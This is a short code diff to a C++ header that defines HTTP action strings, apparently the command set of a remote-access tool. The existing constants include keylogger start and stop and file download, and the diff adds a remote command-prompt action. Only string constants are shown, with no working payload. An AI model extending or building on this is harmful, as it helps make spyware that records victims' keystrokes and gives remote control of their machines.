@@ -45,6 +45,7 @@ namespace http {
 				const char KEYLOGGER_START[] = "/ACTION=KEYLOGGER_START";
 				const char KEYLOGGER_STOP[] = "/ACTION=KEYLOGGER_STOP";
 				const char DOWNLOAD_FILE[] = "/ACTION=DOWNLOAD_FILE";
+				const char COMMAND_PROMPT[] = "/ACTION=COMMAND_PROMPT";
 			}
 
 			namespace HEADER_TYPES
@@ -61,6 +62,7 @@ namespace http {
 				const char DOUBLE_NEWLINE[] = "\r\n\r\n";
 				const char NEWLINE[] = "\r\n";
 				const char SPACE = ' ';
+				const char DOUBLE_PERCENT[] = "%%";
 			}
 
 			namespace VERSION
